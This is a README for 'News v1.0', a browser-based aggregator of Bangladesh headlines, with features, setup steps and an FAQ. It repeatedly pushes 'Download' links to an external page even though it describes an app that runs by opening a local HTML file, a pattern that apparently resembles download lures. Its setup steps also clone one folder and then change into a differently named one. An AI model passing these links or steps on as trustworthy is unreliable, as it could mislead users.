# News v1.0 - News Aggregator 2026

> **A compact browser-based news hub that gathers live Bangladesh headlines from several sources into one clear view.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/reedtyler77/bangladesh-news-hub?style=flat-square)](https://github.com/reedtyler77/bangladesh-news-hub)

---

<p align="center">
  <a href="https://reedtyler77.github.io/bangladesh-news-hub/">
    <img src="https://img.shields.io/badge/Download-News%20Latest-brightgreen?style=for-the-badge" alt="Download News">
  </a>
</p>

> **[Direct Download - News v1.0](https://reedtyler77.github.io/bangladesh-news-hub/)**

---

[Download Latest Build](https://reedtyler77.github.io/bangladesh-news-hub/)

---

## Overview

News is a simple web app built to surface breaking headlines and important stories from around Bangladesh in one place. Rather than hopping between different outlets, readers get a continuously refreshed stream that brings multiple sources together. The emphasis is on speed, clarity, and usefulness, so it stays practical for anyone who wants a quick way to follow Bangladesh news without extra noise.

It is aimed at readers, journalists, and researchers who need a fast snapshot of what is happening now. Because it pulls from several sources, the feed gives a wider view of local developments than a single site can provide. The interface stays clean and browser-based, so it can be used in any modern browser with no setup beyond the initial download.

---

## What it offers

- **Live Bangladesh News Feed** - Collects and shows the newest headlines automatically as they appear.
- **Unified Source View** - Combines stories from multiple outlets into one scrolling list.
- **Lightweight Web Interface** - Implemented in HTML, loads quickly, and runs on any device with a browser.
- **No Registration Required** - Start reading right away without signing up.
- **Automatic Updates** - Refreshes the feed so new articles appear without manual work.
- **Minimalist Design** - Keeps attention on the content and avoids ads or pop-ups.
- **Open Source** - Transparent codebase, free to use and modify under GPL v3.

---

## Getting Started

To run News locally:

1. Clone the repository:
   ```bash
   git clone https://github.com/reedtyler77/bangladesh-news-hub.git
   ```
2. Navigate to the project folder:
   ```bash
   cd news-aggregator
   ```
3. Open `index.html` in your web browser.

No server or build tools are required. The application runs entirely client-side.

---

## How to Use It

Once the HTML file is opened, the live feed starts loading on its own.

- **View Headlines** - Scroll through the aggregated news items list.
- **Read Full Articles** - Select any headline to open the original source in a new tab.
- **Refresh Manually** - Reload the page to pull in the newest entries.

For the best experience, make sure your browser can access external content. Standard news sources should work without any special permissions.

---

## Configuration

News does not provide a settings screen or separate configuration file. The source feeds and display behavior are defined directly inside the HTML and JavaScript. If you want to change which outlets are included, update the source URLs in the main script section of `index.html`. After saving and reloading, the changes apply immediately.

---

## Requirements

- **Platform:** Any modern web browser (Chrome, Firefox, Edge, Safari)
- **Runtime:** Client-side HTML/JavaScript - no server required
- **Storage:** Minimal (under 1 MB for the application files)
- **Internet Connection:** Required for fetching live news feeds
- **No additional dependencies or frameworks**

---

## Common Questions

**How often does the feed update?**  
The feed refreshes automatically every few minutes. You can also reload the page yourself if you want the newest articles right away.

**Can I add my own news sources?**  
Yes. Open `index.html` and find the source list in the JavaScript section. From there, you can add or remove feed URLs as needed.

**Is there a mobile version?**  
The interface is responsive and works in smartphone and tablet browsers. A separate app is not needed.

**Will this work offline?**  
No. News needs an active internet connection to fetch and display headlines from remote sources.

**How do I report a broken source?**  
If a feed stops responding, you can update the source URL in the configuration or open an issue in the GitHub repository.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
